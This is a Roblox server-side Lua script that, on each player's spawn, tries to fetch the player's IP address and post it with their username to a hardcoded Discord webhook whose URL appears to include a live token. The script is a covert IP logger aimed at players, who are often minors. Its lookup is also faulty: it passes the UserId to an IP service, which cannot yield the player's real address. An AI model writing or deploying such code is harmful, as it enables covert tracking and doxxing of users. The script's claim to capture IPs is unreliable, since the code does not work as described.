-- ServerScriptService Script

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Replace with your Discord webhook URL
local WEBHOOK_URL = 'https://discord.com/api/webhooks/1361029884742467866/kwTi8j7UCsDxxtoqpsb773PQdFPHwVNjRVOX_tdCXjADOBIJuZKT9chgB2AspQ5tiFUe'

local function getPlayerIp(player)
    local success, response = pcall(function()
        return HttpService:JSONDecode(HttpService:GetAsync("https://ipinfo.io/" .. player.UserId .. "/json"))
    end)

    if success and response then
        return response.ip
    else
        warn("Failed to retrieve IP address for player " .. player.Name)
        return nil
    end
end

local function sendToDiscord(message)
    local data = {
        content = message
    }

    local options = {
        Url = WEBHOOK_URL,
        Body = HttpService:JSONEncode(data),
        ["Content-Type"] = "application/json"
    }

    HttpService:PostAsync(options.Url, options.Body, Enum.HttpContentType.ApplicationJson, false, options["Content-Type"])
end

local function onPlayerJoined(player)
    player.CharacterAdded:Connect(function(character)
        -- Wait for the player to fully load into the game
        wait(5)

        local ipAddress = getPlayerIp(player)
        if ipAddress then
            local message = "New player joined:\n**Name:** " .. player.Name .. "\n**IP Address:** " .. ipAddress
            sendToDiscord(message)
        end
    end)
end

Players.PlayerAdded:Connect(onPlayerJoined)
